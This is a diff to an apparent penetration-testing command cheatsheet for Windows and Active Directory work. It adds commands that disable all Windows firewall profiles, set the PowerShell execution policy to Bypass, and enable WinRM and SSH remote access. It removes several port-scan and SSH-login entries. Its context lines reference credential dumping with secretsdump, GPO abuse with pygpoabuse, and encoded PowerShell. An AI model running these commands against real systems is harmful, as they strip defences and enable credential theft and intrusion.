@@ -6,13 +6,22 @@ iconv -t utf-16le | base64 -w 0 | (echo -n 'powershell -enc '; cat; echo)
 # Start a tmp samba server
 sudo docker run --rm -it -p 139:139 -p 445:445 -e USERID=$(id -u) -e GROUPID=$(id -g) -v $(pwd):/mount dperson/samba -s 'tmp;/mount;no;no;yes;tmp' -u "tmp;tmp"
 
-% net use
-# Net use a SMB share
-net use Z: <smb_path>
+% enable winrm
+# Enable WinRM
+Enable-PSRemoting -Force -SkipNetworkProfileCheck
 
-% net use with credentials
-# Net use a SMB share
-net use Z: <smb_path> /user:<user> <password>
+% disable firewall
+# Disable firewall
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+% enable ssh
+# Enable SSH and change default shell to powershell
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd; Set-Service -Name sshd -StartupType Automatic
+New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force
+
+% install powershell modules
+# Install powershell modules
+Install-WindowsFeature -Name RSAT-AD-PowerShell; Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0; Set-ExecutionPolicy Bypass -Force; Install-Module OleViewDotNet; Install-Module NtObjectManager
 
 % psdrive
 # Connect a PS drive
@@ -24,20 +33,6 @@ New-PSDrive -Name "<drive_letter>" -PSProvider FileSystem -Root "<smb_path>" -Cr
 $ interface: ip link show | awk -F': ' '{print $2}' | grep .
 $ external_ip: ip -f inet addr show <interface> | awk '/inet / {print $2}' | cut -d'/' -f1
 $ smb_path: echo '\\'"<external_ip>"'\'"<sharename>"
-
-% nmap windows
-# Nmap TCP targets from windows.yaml
-mkdir -p nmap && sudo nmap -v -p- -sC -sV -oA nmap/tcp $(yq '.hosts[].ip' windows.yaml)
-
-% rustscan windows
-# Rustscan TCP targets from windows.yaml
-windows-yaml.sh writelist && sudo rustscan -r 1-65535 --ulimit 5000 -a .ips -- -v -sC -sV | tee rustscan-tcp.log
-
-# Nmap UDP targets from windows.yaml
-mkdir -p nmap && sudo nmap -v -p- -sU -sC -sV -oA nmap/udp $(yq '.hosts[].ip' windows.yaml)
-
-# Rustscan UDP targets from windows.yaml
-windows-yaml.sh writelist && sudo rustscan -r 1-65535 --ulimit 5000 -a .ips --udp -- -v -sC -sV | tee rustscan-udp.log
 
 % secretsdump
 @ windows-variables
@@ -54,11 +49,6 @@ $ syspath: find . -type f
 @ windows-variables
 # pygpoabuse
 pygpoabuse.py '<domain>/<user_with_password>:<password_for_user>' -gpo-id '<gpo_id>'
-
-% windows ssh
-@ windows-variables
-# ssh with windows creds
-sshpass -p '<password_for_user>' ssh '<user_with_password>'@'<ip_or_fqdn>'
 
 % mssql
 # mssql query
